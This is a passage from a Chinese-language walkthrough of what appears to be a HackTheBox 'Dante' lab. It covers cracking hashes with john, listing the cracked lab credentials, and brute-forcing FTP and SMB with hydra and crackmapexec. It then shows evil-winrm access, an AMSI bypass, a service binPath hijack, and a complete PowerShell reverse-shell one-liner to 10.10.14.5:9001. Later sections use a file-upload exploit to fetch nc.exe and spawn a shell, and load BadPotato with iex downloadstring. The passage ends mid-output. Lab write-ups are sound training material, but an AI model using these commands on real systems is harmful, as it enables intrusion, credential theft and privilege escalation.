Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
0g 0:00:00:19 DONE <span class="o">(</span>2023-12-27 07:13<span class="o">)</span> 0g/s 712123p/s 712123c/s 712123C/s <span class="o">!!!</span>0mc3t..<span class="k">*</span>7¡Vamos!
Session completed. 
</code></pre></div></div>
<p>指定新的加密方式后可以正常跑出明文为 manchesterunited</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/webtools/dicts/rockyou.txt 172.16.1.12_unshadow <span class="nt">--format</span><span class="o">=</span>md5crypt-long

Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt-long, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 32/64]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
manchesterunited <span class="o">(</span>julian<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-12-27 07:17<span class="o">)</span> 25.00g/s 70400p/s 70400c/s 70400C/s bebito..medicina
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<p>至此我们掌握了多个用户凭证：</p>
<ol>
  <li>julian/manchesterunited</li>
  <li>ben/Welcometomyblog</li>
  <li>balthazar/TheJoker12345!</li>
  <li>mrb3n/S3kur1ty2020!</li>
  <li>Admin_129834765/SamsungOctober102030</li>
</ol>

<p>还有此前在 172.16.1.20 中获取到的 excel 表格。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith	Princess1
smoggat	Summer2019
tmodle	P45678!
ccraven	Password1
kploty	Teacher65
jbercov	4567Holiday1
whaguey	acb123
dcamtan	WorldOfWarcraft67
tspadly	RopeBlackfieldForwardslash
ematlis	JuneJuly1TY
fglacdon	FinalFantasy7
tmentrso	65RedBalloons
dharding	WestminsterOrange5
smillar	MarksAndSparks91
bjohnston	Bullingdon1
iahmed	Sheffield23
plongbottom	PowerfixSaturdayClub777
jcarrot	Tanenbaum0001
lgesley	SuperStrongCantForget123456789
</code></pre></div></div>
<h1 id="linux-172161101">Linux: 172.16.1.101</h1>
<p>172.16.1.101	21
172.16.1.101	135
172.16.1.101	139
172.16.1.101	445</p>

<h2 id="ftp-爆破">FTP 爆破</h2>
<p>172.16.1.101 的 ftp 不允许匿名登陆，并且 FileZilla Server 0.9.60 beta 不存在可用的 exp。</p>

<p>借助此前获取的用户名密码，我们可以爆破 ftp，首先将用户名保存在 users.txt 密码保存在 password.txt 中。然后运行 hydra。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">HYDRA_PROXY</span><span class="o">=</span>socks5://localhost:1080 
hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> password.txt 172.16.1.101 ftp <span class="nt">-V</span>
</code></pre></div></div>
<p>默认情况下 hydra 会对单个用户名尝试所有的密码，为了加快速度，我们可以使用 combine 模式来将用户名密码一一对应。先将用户名密码以 : 切分写在单个文件中。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith:Princess1
smoggat:Summer2019
tmodle:P45678!
ccraven:Password1
kploty:Teacher65
jbercov:4567Holiday1
whaguey:acb123
dcamtan:WorldOfWarcraft67
tspadly:RopeBlackfieldForwardslash
ematlis:JuneJuly1TY
fglacdon:FinalFantasy7
tmentrso:65RedBalloons
dharding:WestminsterOrange5
smillar:MarksAndSparks91
bjohnston:Bullingdon1
iahmed:Sheffield23
plongbottom:PowerfixSaturdayClub777
jcarrot:Tanenbaum0001
lgesley:SuperStrongCantForget123456789
julian:manchesterunited
ben:Welcometomyblog
balthazar:TheJoker12345!
mrb3n:S3kur1ty2020!
Admin_129834765:SamsungOctober102030
</code></pre></div></div>

<p>然后 hydra 爆破时使用 -C 参数。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">HYDRA_PROXY</span><span class="o">=</span>socks5://localhost:1080 
hydra <span class="nt">-C</span> combine.txt 172.16.1.101 ftp <span class="nt">-V</span>
</code></pre></div></div>
<p>很快就能够得到结果，dharding/WestminsterOrange5 可以正常登陆</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>21][ftp] host: 172.16.1.101   login: dharding   password: WestminsterOrange5
</code></pre></div></div>
<p>登陆之后获取到 <code class="language-plaintext highlighter-rouge">Remote login.txt</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dido,
I<span class="s1">'ve had to change your account password due to some security issues we have recently become aware of

It'</span>s similar to your FTP password, but with a different number <span class="o">(</span>ie. not 5!<span class="o">)</span>

Come and see me <span class="k">in </span>person to retrieve your password.

thanks,
James                                                                                                                    
</code></pre></div></div>
<p>从提示中可以看出该用户远程登陆的密码与 FTP 密码相同但最后一个数字不是 5。因此我们可以构造一个密码字典来进行爆破。</p>

<h2 id="smb-爆破">SMB 爆破</h2>
<p>这台主机没有 ssh,也没有开放 3389 端口，但可以尝试用 smb 来验证密码是否正确。</p>

<p>cme 或者 nxc 集成了 SMB 爆破的功能。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> crackmapexec smb 172.16.1.101 <span class="nt">-u</span> users.txt <span class="nt">-p</span> password.txt
</code></pre></div></div>
<p>尝试到 WestminsterOrange17 时成功登陆。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:DANTE-WS02<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS02<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange0 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange1 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange2 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange3 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange4 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange6 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange7 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange8 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange9 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange10 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange11 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange12 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange13 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange14 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange15 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange16 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>+] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange17
</code></pre></div></div>
<h2 id="winrm-远程登陆">WinRM 远程登陆</h2>
<p>172.16.1.101 实际上开放了 5985 端口，此前使用 fscan 扫描时没有扫到的原因在于，fscan 默认扫描端口：”21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017”</p>

<p>goby 企业端口列表中也没有 5985：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>21,22,23,25,53,U:53,U:69,80,81,U:88,110,111,U:111,123,U:123,135,U:137,139,U:161,U:177,389,U:427,443,445,465,500,515,U:520,U:523,548,623,U:626,636,873,902,1080,1099,1433,U:1434,1521,U:1604,U:1645,U:1701,1883,U:1900,2049,2181,2375,2379,U:2425,3128,3306,3389,4730,U:5060,5222,U:5351,U:5353,5432,5555,5601,5672,U:5683,5900,5938,5984,6000,6379,7001,7077,8080,8081,8443,8545,8686,9000,9001,9042,9092,9100,9200,9418,9999,11211,U:11211,27017,U:33848,37777,50000,50070,61616
</code></pre></div></div>

<p>以后使用 fscan 扫描时可以使用 goby 内置的常用端口列表：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fscan <span class="nt">-h</span> 172.16.1.0/24 <span class="nt">-socks5</span> 127.0.0.1:1080 <span class="nt">-p</span> <span class="s2">"1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,105,109-111,113,123,135,137-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,873,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2082,2083,2100,2103,2121,2199,2207,2222,2323,2362,2375,2380-2381,2525,2533,2598,2601,2604,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3311,3312,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5601,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6082,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9060,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9443,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535"</span> <span class="nt">-nobr</span> <span class="nt">-nopoc</span>
</code></pre></div></div>

<p>5985 端口可以使用 evil-winrm 进行连接。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> evil-winrm <span class="nt">-i</span> 172.16.1.101 <span class="nt">-u</span> dharding <span class="nt">-p</span> WestminsterOrange17
</code></pre></div></div>
<p>登陆之后可以查看 dharding 用户的 flag.txt</p>

<h2 id="提权-服务-acl-配置错误">提权: 服务 ACL 配置错误</h2>
<p>dharding Desktop 目录中有一个 qc 文件，内容为 IObitUnSvr。</p>

<p>使用 evil-winrm 加载 winPEAS。（evil-winrm 加载 ps 脚本的速度比较慢）</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> evil-winrm <span class="nt">-i</span> 172.16.1.101 <span class="nt">-u</span> dharding <span class="nt">-p</span> WestminsterOrange17 <span class="nt">-s</span> /webtools/movement/PowerSharpPack/PowerSharpBinaries
Bypass-4MSI
Invoke-winPEAS.ps1
Invoke-winPEAS
</code></pre></div></div>

<p>关注非微软程序或服务，可以看到有一个 IObit Uninstaller。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Scheduled Applications <span class="nt">--Non</span> Microsoft--
╚ Check <span class="k">if </span>you can modify other <span class="nb">users </span>scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                              
    <span class="o">(</span>dharding<span class="o">)</span> Uninstaller_SkipUac_dharding: C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\I</span>Obit<span class="se">\I</span>Obit Uninstaller<span class="se">\I</span>ObitUninstaler.exe /UninstallExplorer 
</code></pre></div></div>
<p>查询 exploitdb 可以发现该应用存在历史漏洞：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                   |  Path
<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
IObit Uninstaller 10 Pro - Unquoted Service Path                                                                 | windows/local/49371.txt
IObit Uninstaller 9.1.0.8 - <span class="s1">'IObitUnSvr'</span> Unquoted Service Path                                                   | windows/local/47538.txt
IObit Uninstaller 9.5.0.15 - <span class="s1">'IObit Uninstaller Service'</span> Unquoted Service Path                                   | windows/local/48543.txt
<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------</span>
</code></pre></div></div>
<p>目录下的 History.txt 包含了版本信息，版本为 9.5，存在 Unquoted Service Path 提权漏洞。该漏洞的利用需要在 C:\Program Files (x86)\IObit 写入恶意的 IObit.exe，但该路径没有写入权限。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls <span class="nb">.</span>
<span class="nb">.</span> NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
  NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
  CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
</code></pre></div></div>

<p>通过 Get-ServiceAcl.ps1 查看 IObitUnSvr 服务的 ACL 时，发现 dharding 具备 ChangeConfig 权限，可以更改配置。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>harding<span class="se">\D</span>ocuments&gt; Get-ServiceAcl.ps1
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>harding<span class="se">\D</span>ocuments&gt; <span class="s2">"IObitUnSvr"</span> | Get-ServiceAcl | <span class="k">select</span> <span class="nt">-ExpandProperty</span> Access

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl
AccessControlType : AccessAllowed
IdentityReference : DANTE-WS02<span class="se">\d</span>harding
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
</code></pre></div></div>
<p>因此只需要更改服务的 binPath，然后重启服务即可提权。</p>

<p>首先准备一个反弹 shell 的 bat 脚本：runme.bat</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@echo off
start /b powershell.exe <span class="nt">-exec</span> bypass <span class="nt">-enc</span> &lt;base64_encoded_payload&gt; 
<span class="nb">exit</span> /b
</code></pre></div></div>
<p>其中的 base64_encoded_payload 原始 payload 如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.14.5'</span>,9001<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte[]]<span class="nv">$bytes</span> <span class="o">=</span> 0..65535|%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> <span class="nt">-ne</span> 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object <span class="nt">-TypeName</span> System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;&amp;1 | Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">'PS '</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>

</code></pre></div></div>
<p>使用 UTF-16LE 和 base64 编码后进行填充写入 runme.bat</p>

<p>将 runme.bat 下载到 c:\temp 下。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mkdir</span><span class="w"> </span><span class="nx">c:\temp</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">c:\temp</span><span class="w">
</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://10.10.14.5:9999/runme.bat'</span><span class="p">,</span><span class="s1">'c:\temp\runme.bat'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>
<p>本地监听 9001：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 9001
</code></pre></div></div>
<p>接着在目标中更改 IObitUnSvr 的配置。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">IObitUnSvr</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">IObitUnSvr</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="s2">"cmd.exe /c c:\temp\runme.bat"</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="nx">IObitUnSvr</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">IObitUnSvr</span><span class="w">
</span></code></pre></div></div>
<p>启动 IObitUnSvr 可以接收到 shell。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                  
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                  
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">08</span><span class="n">/01/2021</span><span class="w">     </span><span class="nx">05:34</span><span class="w">             </span><span class="nx">33</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w">                                                              
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">14</span><span class="n">/07/2020</span><span class="w">     </span><span class="nx">03:18</span><span class="w">           </span><span class="nx">1417</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Edge.lnk</span><span class="w">                                                    


</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w">
</span><span class="n">DANTE</span><span class="p">{</span><span class="n">Qu0t3_I_4M_secure</span><span class="o">!</span><span class="nx">_unQu0t3</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<h1 id="windows-172161102">Windows: 172.16.1.102</h1>
<p>开放端口：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5985,135,445,3389,139,3306,443,47001,80,5040
</code></pre></div></div>
<ol>
  <li>80/443: Online Marriage Registration System</li>
  <li>47001: Microsoft-HTTPAPI/2.0</li>
</ol>

<h2 id="80-端口文件上传漏洞">80 端口文件上传漏洞</h2>
<p>80 端口部署了一个 Online Marriage Registration System。exploitdb 可以搜索到相关的 exp：</p>
<ul>
  <li>https://www.exploit-db.com/exploits/49557</li>
</ul>

<p>首先上传 nc</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> python /webtools/exploit/OMRS/exp.py <span class="nt">-u</span> http://172.16.1.102/ <span class="nt">-c</span> <span class="s1">'powershell.exe wget 10.10.14.5:9999/nc.exe -O nc.exe'</span>
</code></pre></div></div>

<p>然后使用 nc 反弹 shell。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> python /webtools/exploit/OMRS/exp.py <span class="nt">-u</span> http://172.16.1.102/ <span class="nt">-c</span> <span class="s1">'nc.exe -e powershell.exe 10.10.14.5 9001'</span>
</code></pre></div></div>

<p>获取到 dante-ws03\blake 权限后可读取用户 flag.txt</p>

<h2 id="提权-badpotato">提权: BadPotato</h2>
<p>首先使用 winPEAS 收集信息，可以将结果写到文件，然后拖回来分析。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://10.10.14.5:9999/Invoke-winPEAS.ps1'</span><span class="p">)</span><span class="w">
</span><span class="nx">Invoke-winPEAS</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="o">.</span><span class="nf">out</span><span class="w">
</span></code></pre></div></div>
<p>dante-ws03\blake 具备 SeImpersonatePrivilege 权限，可以使用 Potato 家族进行提权。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
</code></pre></div></div>

<p>BadPotato 是 SweetPotato 的 C# 版本，PowerSharpPack 中已经集成了 BadPotato 的 powershell 版本。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>c:<span class="se">\t</span>emp
<span class="nb">cd </span>c:<span class="se">\t</span>emp
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://10.10.14.5:9999/runme.bat'</span>,<span class="s1">'c:\temp\runme.bat'</span><span class="o">)</span>

iex<span class="o">(</span>new-object net.webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s1">'http://10.10.14.5:9999/Invoke-BadPotato.ps1'</span><span class="o">)</span>

Invoke-BadPotato <span class="nt">-Command</span> <span class="s2">"c:</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\r</span><span class="s2">unme.bat"</span>
</code></pre></div></div>
<p>但执行之后无法成功，直接通过 <code class="language-plaintext highlighter-rouge">whoami /priv</code> 显示 <code class="language-plaintext highlighter-rouge">Access is denied</code>。</p>

<p>执行 msf 载荷，获取到一个 meterpreter 之后再进入 powershell 就可以成功提权了。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\t</span>emp&gt; Invoke-BadPotato <span class="nt">-Command</span> <span class="s2">"whoami"</span>
Invoke-BadPotato <span class="nt">-Command</span> <span class="s2">"whoami"</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span>

    ____            ______        __        __      
   / __ <span class="o">)</span>____ _____/ / __ <span class="se">\_</span>___  / /_____ _/ /_____ 
  / __  / __ <span class="sb">`</span>/ __  / /_/ / __ <span class="se">\/</span> __/ __ <span class="sb">`</span>/ __/ __ <span class="se">\</span>
 / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
/_____/<span class="se">\_</span>_,_/<span class="se">\_</span>_,_/_/    <span class="se">\_</span>___/<span class="se">\_</span>_/<span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>___/ 

Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
            
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PipeName : <span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\6</span>6836c1007e24080b640ea5c4d421270<span class="se">\p</span>ipe<span class="se">\s</span>poolss
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ConnectPipeName : <span class="se">\\</span>DANTE-WS03/pipe/66836c1007e24080b640ea5c4d421270
